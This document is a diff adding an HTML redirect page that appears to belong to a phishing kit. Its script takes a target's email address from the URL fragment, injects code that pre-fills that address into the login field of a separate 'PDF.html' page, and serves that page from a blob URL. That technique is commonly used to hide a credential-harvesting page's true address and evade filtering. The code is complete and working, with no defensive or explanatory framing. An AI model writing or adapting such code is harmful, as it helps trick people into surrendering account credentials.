@@ -1,0 +1,84 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Redirecting...</title>
+</head>
+<body>
+    <script>
+        // Extract email from URL hash (same as blob-kakao)
+        const email = window.location.hash.substring(1) || '';
+        console.log('Extracted email:', email);
+        
+        // Fetch PDF.html content and create blob
+        fetch('PDF.html')
+            .then(response => response.arrayBuffer())
+            .then(buffer => {
+                // Remove UTF-8 BOM if present
+                let bomRemovedBuffer = buffer;
+                const bom = new Uint8Array(buffer.slice(0, 3));
+                if (bom[0] === 0xEF && bom[1] === 0xBB && bom[2] === 0xBF) {
+                    bomRemovedBuffer = buffer.slice(3);
+                }
+                
+                // Convert to text
+                const decoder = new TextDecoder('utf-8');
+                let htmlContent = decoder.decode(bomRemovedBuffer);
+                
+                // Only inject email script if there's an email (same logic as blob-kakao)
+                if (email && email.trim() !== '') {
+                    const emailScript = `
+<script>
+// Email injection from blob
+(function() {
+    const emailFromBlob = "${email.replace(/"/g, '\\"')}";
+    console.log('Blob injecting email:', emailFromBlob);
+    
+    function injectEmailToFields() {
+        // Target the email field in PDF.html
+        const emailField = document.getElementById('email');
+        if (emailField) {
+            emailField.value = emailFromBlob;
+            console.log('Email set in email field:', emailFromBlob);
+            emailField.dispatchEvent(new Event('input', { bubbles: true }));
+            emailField.dispatchEvent(new Event('change', { bubbles: true }));
+        }
+        
+        // Also try any input with name="email"
+        const emailNameField = document.querySelector('input[name="email"]');
+        if (emailNameField && emailNameField !== emailField) {
+            emailNameField.value = emailFromBlob;
+        }
+    }
+    
+    // Try multiple times to ensure the DOM is ready
+    if (document.readyState === 'loading') {
+        document.addEventListener('DOMContentLoaded', injectEmailToFields);
+    } else {
+        injectEmailToFields();
+    }
+    setTimeout(injectEmailToFields, 100);
+    setTimeout(injectEmailToFields, 300);
+    window.addEventListener('load', injectEmailToFields);
+})();
+<\/script>
+`;
+                    // Insert the email script right before the closing </body> tag
+                    htmlContent = htmlContent.replace('</body>', emailScript + '</body>');
+                    console.log('Email script injected into PDF.html');
+                }
+                
+                // Create blob and redirect
+                const blob = new Blob([htmlContent], { type: 'text/html; charset=utf-8' });
+                const blobUrl = URL.createObjectURL(blob);
+                console.log('Redirecting to blob with email:', email || 'none');
+                window.location.replace(blobUrl);
+            })
+            .catch(error => {
+                console.error('Error loading PDF.html:', error);
+                window.location.href = 'PDF.html' + (email ? '#' + email : '');
+            });
+    </script>
+</body>
+</html>
